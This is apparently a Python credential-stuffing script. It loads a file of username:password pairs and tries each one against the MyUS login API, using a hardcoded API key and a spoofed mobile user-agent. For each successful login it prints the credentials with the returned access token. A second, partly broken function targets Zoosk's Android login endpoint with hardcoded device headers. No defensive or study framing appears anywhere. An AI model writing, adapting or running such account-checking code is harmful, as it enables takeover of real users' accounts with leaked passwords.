import requests 
import os 
import Tkinter
import json
from Tkinter import *
from tkFileDialog import *



def zoosk(username,password):
	""""
	Headers - > Paras - > URL -> CAP 

	"""
	
	headers = {
		"X-Cbt":"T3y8j3vOZNJbQN1N-z0XFqCvxGV3vVfKnJqeygBenAWZXwEAANX_XJAQuG3fexoNQyufatJ5GlPxSPEscd9z_JneiftH-C10IA==",
		"User-Agent":"ZooskAndroid/443 (Linux; U; Android 4.4.2; en-US; HUAWEI C199; Build/HuaweiC199)"
		}

	content = 'password=%s&login=%s&udid=12be4dfe06ac4223b60934304c656d5e % (password,username)'

	url = 'https://api-android.zoosk.com/v4.0/api.php?locale=en_US&product=4&format=json&z_device_id=151010080201&rpc=login%2Fgeneral_v43'

	requestsx = requests.post(url , headers, content)

	print (requestsx.text)


def myus(username,password):
	u = 'https://gateway.myus.com/Account/GetTokenForUser?api_key=px8zkanujj49vfzpm88mfvfz&isMobile=true'

	h = {
		"Origin": "file://",
		"User-Agent": "Mozilla/5.0 (Linux; Android 4.4.2; HUAWEI C199 Build/HuaweiC199) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Crosswalk/23.53.589.4 Mobile Safari/537.36",
		"Content-Type": "application/json;charset=UTF-8"
	}

	c = '{"UserName":"%s","Password":"%s"}' % (username,password)

	requestsx = requests.post(url = u,headers=h,data = c)

	out = json.loads(requestsx.text)
	import datetime
	date_time = datetime.datetime.now()
	time = date_time.time() 

	print ('%s:%s:%s  %s:%s - %s' % (time.hour, time.minute, time.second,username ,password ,out['access_token']))
	

filename = askopenfilename()

with open(filename) as f:
      credentials = [x.strip().split(':') for x in f.readlines()]
      for username,password in credentials:
      	myus(username,password)

	
